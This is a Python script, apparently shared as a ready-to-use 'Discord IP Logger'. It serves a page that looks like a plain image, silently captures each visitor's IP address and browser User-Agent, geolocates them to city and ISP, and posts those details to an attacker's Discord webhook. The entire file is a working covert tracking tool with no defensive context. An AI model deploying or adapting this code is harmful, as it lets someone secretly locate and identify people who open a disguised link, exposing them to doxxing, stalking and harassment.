# Discord IP Logger
# By trahzi

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests, traceback


config = {
    "webhook": "YOUR_DISCORD_WEBHOOK_HERE",
    "image": "https://your-image-url.com/image.jpg",  # Image to be displayed
    "username": "IP Logger",
    "color": 0x3498db,  # Blue color for embed
    "logUserAgent": True,  # Log User-Agent information
}


class IPLogger(BaseHTTPRequestHandler):
    def log_ip(self, ip, user_agent):
        try:
            # Get IP details
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,query").json()
            country = response.get("country", "Unknown")
            region = response.get("regionName", "Unknown")
            city = response.get("city", "Unknown")
            isp = response.get("isp", "Unknown")

            
            embed = {
                "username": config["username"],
                "embeds": [{
                    "title": "New Visitor Logged",
                    "color": config["color"],
                    "description": f"**IP:** `{ip}`\n"
                                   f"**Country:** `{country}`\n"
                                   f"**Region:** `{region}`\n"
                                   f"**City:** `{city}`\n"
                                   f"**ISP:** `{isp}`\n"
                                   f"**User-Agent:** `{user_agent if config['logUserAgent'] else 'Not logged'}`",
                    "thumbnail": {"url": config["image"]}
                }]
            }
            requests.post(config["webhook"], json=embed)
        except Exception as e:
            print("Error logging IP:", e)
            traceback.print_exc()

    def do_GET(self):
        try:
            # Get IP & User-Agent
            ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')

        
            self.log_ip(ip, user_agent)

            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f"""<html><head><style>
            body {{ margin: 0; background: url('{config["image"]}') no-repeat center center fixed;
            background-size: cover; }}</style></head><body></body></html>""".encode())
        except Exception:
            self.send_response(500)
            self.end_headers()
            traceback.print_exc()

# Run the server
server = HTTPServer(('0.0.0.0', 8080), IPLogger)
print("Server running on port 8080...")
server.serve_forever()
